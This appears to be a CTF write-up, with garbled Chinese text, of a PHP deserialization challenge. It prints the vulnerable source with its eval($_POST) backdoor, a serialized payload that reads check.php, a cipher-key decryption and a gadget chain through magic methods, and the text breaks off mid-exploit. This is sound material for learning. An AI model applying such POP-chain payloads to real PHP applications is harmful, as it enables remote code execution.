<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å½“å‰ç›®å½•ä¸­æœ‰ä¸€ä¸ªtxtæ–‡ä»¶å“¦
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;check.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">EeE</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$text</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$eeee</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">text</span> <span class="o">==</span> <span class="s2">&#34;aaaa&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nx">lcfirst</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">text</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$kk</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$kk</span><span class="s2">,eeeeeeeeeeeee&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__clone</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">cycycycy</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$a</span> <span class="o">-&gt;</span> <span class="na">aaa</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">cycycycy</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">aaa</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$get</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;get&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$get</span> <span class="o">=</span> <span class="nx">cipher</span><span class="p">(</span><span class="nv">$get</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$get</span> <span class="o">===</span> <span class="s2">&#34;p8vfuv8g8v8py&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;eval&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$a_a</span> <span class="o">=</span> <span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\$</span><span class="s2">a_a</span><span class="se">\$</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">gBoBg</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$coos</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$eeee</span><span class="o">=</span><span class="s2">&#34;-_-&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">coos</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">file</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">coos</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$aa</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">coos</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$bb</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$aa</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">w_wuw_w</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$aaa</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/php|63|\*|\?/i&#34;</span><span class="p">,</span><span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">key</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;ä¸è¡Œå“¦&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">aaa</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">aaa</span> <span class="o">=</span> <span class="k">clone</span> <span class="k">new</span> <span class="nx">EeE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$_ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;HTTP_AAAAAA&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_ip</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// cloneå…³é”®å­—:ç”¨äºå…‹éš†ä¸€ä¸ªå®Œå…¨ä¸€æ ·çš„å¯¹è±¡ï¼Œå…‹éš†ä¹‹åä¸¤ä¸ªå¯¹è±¡äº’ä¸å¹²æ‰°ã€‚
</span></span></span><span class="line"><span class="cl"><span class="c1">// __clone() æ–¹æ³•åªä¼šåœ¨å¯¹è±¡è¢«å…‹éš†çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨ã€‚
</span></span></span></code></pre></td></tr></table>
</div>
</div><h4 id="1åšé¢˜æ€è·¯-1">1.åšé¢˜æ€è·¯</h4>
<p>å…ˆçœ‹ä»£ç ï¼Œå‰é¢æ˜¯å„ç§ç±»ï¼Œæœ€ä¸‹é¢æœ‰å¥ååºåˆ—åŒ–ä»£ç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$_ip = $_SERVER[&#34;HTTP_AAAAAA&#34;];
</span></span></code></pre></td></tr></table>
</div>
</div><p>$ip = $SERVER[&ldquo;HTTP_AAAAAA&rdquo;]; ï¼šæ¥æ”¶headerå¤´ä¸­ aaaaaaå‚æ•°çš„å€¼ï¼Œç„¶åå°†å…¶ååºåˆ—åŒ–ã€‚</p>
<p>å‘ç°é¢˜ç›®åŒ…å«äº†check.phpï¼Œå°è¯•è¯»å–ï¼Œåˆ©ç”¨w_wuw_wç±»</p>
<p>æ­¤ç±»ååºåˆ—åŒ–ä¹‹å‰å…ˆè§¦å‘wakeupè¿™ä¸ªæ–¹æ³•ï¼Œæ£€æµ‹keyä¸­æ˜¯å¦æœ‰å…³é”®å­—</p>
<p>æŠŠè¯»å–fileçš„å†…å®¹ç»™keyï¼Œç»“æŸæ—¶æ˜¾ç¤ºaaaï¼Œå¯ä»¥ç”¨å¼•ç”¨æŠŠaaaå˜é‡å’Œkeyå˜é‡ç»‘å®šï¼Œè®©aaaå’Œkeyçš„å†…å®¹ç›¸åŒï¼Œä»è€Œçœ‹åˆ°æ–‡ä»¶å†…å®¹ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">w_wuw_w</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$aaa</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">w_wuw_w</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">aaa</span><span class="o">=&amp;</span><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">=</span><span class="s2">&#34;check.php&#34;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"># æ ‡å‡†è¾“å‡ºï¼šO:7:&#34;w_wuw_w&#34;:3:{s:3:&#34;aaa&#34;;N;s:3:&#34;key&#34;;R:2;s:4:&#34;file&#34;;s:9:&#34;check.php&#34;;}
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>check.phpçš„æºç :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">cipher</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">10000</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$charset</span> <span class="o">=</span> <span class="s2">&#34;qwertyuiopasdfghjklzxcvbnm123456789&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$shift</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$shifted</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$char</span> <span class="o">=</span> <span class="nv">$str</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$pos</span> <span class="o">=</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$charset</span><span class="p">,</span> <span class="nv">$char</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$pos</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$new_pos</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$pos</span> <span class="o">-</span> <span class="nv">$shift</span> <span class="o">+</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$charset</span><span class="p">))</span> <span class="o">%</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$charset</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$shifted</span> <span class="o">.=</span> <span class="nv">$charset</span><span class="p">[</span><span class="nv">$new_pos</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$shifted</span> <span class="o">.=</span> <span class="nv">$char</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$shifted</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‘ç°å‡½æ•°cipheråœ¨ç±»cycycycyä¸­è¢«è°ƒç”¨ï¼ŒçŒœæµ‹æ˜¯check.phpæ˜¯ä¸ªåŠ å¯†è„šæœ¬ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$get</span> <span class="o">===</span> <span class="s2">&#34;p8vfuv8g8v8py&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;eval&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥åœ¨ç±»cycycycyå¾—çŸ¥ï¼Œå¯†æ–‡ä¸ºp8vfuv8g8v8py</p>
<p>è§‚å¯Ÿå‘ç°æ˜¯ç®€å•çš„å‡¯æ’’ç§»ä½å¯†ç ï¼Œå¯ä»¥åˆ©ç”¨åœ¨çº¿å·¥å…·æˆ–è€…è„šæœ¬è§£å¯†ä¸€ä¸‹ã€‚</p>
<p>phpè§£å¯†è„šæœ¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">decipher</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">10000</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nv">$charset</span> <span class="o">=</span> <span class="s2">&#34;qwertyuiopasdfghjklzxcvbnm123456789&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$shift</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$deciphered</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$char</span> <span class="o">=</span> <span class="nv">$str</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$pos</span> <span class="o">=</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$charset</span><span class="p">,</span> <span class="nv">$char</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$pos</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$new_pos</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$pos</span> <span class="o">+</span> <span class="nv">$shift</span><span class="p">)</span> <span class="o">%</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$charset</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$deciphered</span> <span class="o">.=</span> <span class="nv">$charset</span><span class="p">[</span><span class="nv">$new_pos</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$deciphered</span> <span class="o">.=</span> <span class="nv">$char</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$deciphered</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>pythonè§£å¯†è„šæœ¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">charset</span> <span class="o">=</span> <span class="s1">&#39;qwertyuiopasdfghjklzxcvbnm123456789&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="s1">&#39;p8vfuv8g8v8py&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">key</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="n">charset</span><span class="p">[(</span><span class="n">charset</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">charset</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è§£å¯†åæ˜æ–‡:fe1ka1ele1efp</p>
<p>ä¸ºäº†åˆ©ç”¨postä¼ å‚ï¼Œéœ€è¦è§¦å‘aaa()æ–¹æ³•ï¼Œä»è°è§¦å‘äº†aaa()æ–¹æ³•æ¥æ¨å¯¼ï¼Œå€’ç€æ¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">EeEçš„_cloneæ–¹æ³•è§¦å‘cycycyçš„aaa,
</span></span><span class="line"><span class="cl">w_wuw_wçš„__invokeæ–¹æ³•è§¦å‘EeEçš„__clone
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">å¦‚ä½•è°ƒç”¨__invokeæ–¹æ³•ï¼Ÿ
</span></span><span class="line"><span class="cl">__invoke() //å½“å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘
</span></span><span class="line"><span class="cl">__toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘
</span></span><span class="line"><span class="cl">__wakeup() //æ‰§è¡Œunserialize()ï¼Œä¼šå…ˆè°ƒç”¨è¿™ä¸ªå‡½æ•°
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">gBoBgçš„_toStringæ–¹æ³•å¦‚æœè®©aaä¸ºw_wuw_wç±»ï¼Œåˆ™èƒ½è§¦å‘wuwçš„_invokeï¼Œ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">å¦‚ä½•è§¦å‘gBoBgçš„_toStringæ–¹æ³•ï¼Ÿ
</span></span><span class="line"><span class="cl">EeEçš„_wakeupæ–¹æ³•èƒ½è§¦å‘gBoBgçš„toString
</span></span><span class="line"><span class="cl">EeEçš„textèµ‹å€¼ä¸ºgBoBg
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$a = new EeE();
</span></span><span class="line"><span class="cl">$a -&gt;text = new gBoBg(); // è§¦å‘äº†gBoBgçš„_toStringæ–¹æ³•
</span></span><span class="line"><span class="cl">$a -&gt;text -&gt;coos = new w_wuw_w(); // è§¦å‘äº†w_wuw_wçš„__invokeæ–¹æ³•
</span></span><span class="line"><span class="cl">$a -&gt;text -&gt;file = &#34;any&#34;; 
</span></span><span class="line"><span class="cl">echo serialize($a);
</span></span></code></pre></td></tr></table>
</div>
</div><p>å®Œæ•´çš„phpååºåˆ—åŒ–æ„é€ </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">EeE</span><span class="p">{</span>
